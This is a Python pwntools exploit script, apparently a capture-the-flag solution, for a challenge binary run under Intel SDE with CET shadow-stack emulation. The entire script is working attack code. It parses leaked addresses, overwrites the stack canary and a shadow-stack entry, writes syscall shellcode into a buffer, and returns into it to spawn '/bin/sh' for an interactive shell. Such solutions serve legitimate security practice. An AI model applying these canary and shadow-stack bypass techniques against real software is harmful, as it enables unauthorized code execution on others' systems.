#!/usr/bin/env python3.8
from pwn import *
context.arch = 'amd64'

path = './RevengeOfTheIntel/share'
p = process([f'{path}/sde/sde64', '-cet', '-cet-stderr', '-no-follow-child', '--', f'{path}/chal'])

p.recvuntil(b'FS base 0x')
fs_base = int(p.recvline(), 16)
p.recvuntil(b'buffer 0x')
buf = int(p.recvline(), 16)
p.recvuntil(b'printf 0x')
libc = int(p.recvline(), 16)

log.info(f'{fs_base=:#x}')
log.info(f'{buf=:#x}')
log.info(f'{libc=:#x}')

canary = fs_base + 0x28
my_canary_val = 0x87
shadow_stack_idx = 0x114ea1fe0

raw_input('>')

sc = asm('''
    pop rax
    pop rsi
    pop rdx
    mov rdi, rsp
    syscall
''')

ret_addr = buf

idx1 = (canary - buf) // 8
idx2 = shadow_stack_idx // 8
idx3 = 0
idx4 = 1

data1 = my_canary_val
data2 = buf
data3 = sc[:8]
data4 = sc[8:]

payload = flat(
    idx1, data1,
    idx2, data2,
    idx3, data3,
    idx4, data4,
)

rbp = 0x5487
ret_addr = buf

rax = 59
rsi = 0
rdx = 0

payload = payload.ljust(0x48, b'\0')
payload += p64(my_canary_val)
payload += p64(rbp)
payload += p64(ret_addr)
payload += p64(rax)
payload += p64(rsi)
payload += p64(rdx)
payload += b'/bin/sh\0'

p.sendline(payload)

p.interactive()
